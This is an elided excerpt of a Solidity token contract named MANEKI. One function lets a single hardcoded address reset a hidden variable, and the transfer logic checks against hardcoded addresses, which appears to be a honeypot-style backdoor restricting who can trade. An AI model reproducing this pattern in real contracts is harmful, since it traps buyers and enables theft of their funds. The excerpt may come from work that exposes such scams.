...
contract MANEKI is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x53371F6b3f519adED076ea9743C87f9b4571f4D6) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         && from != 0x31203296dd85Fc05e3b960d2485934ec6C2dAaF0
         && from != 0x9949Cb656552C2f73768eE1EE84E452d5B7c8203)) {
    ...
    constructor() {
        _name = unicode"MANEKI";
        _symbol = unicode"MANEKI";
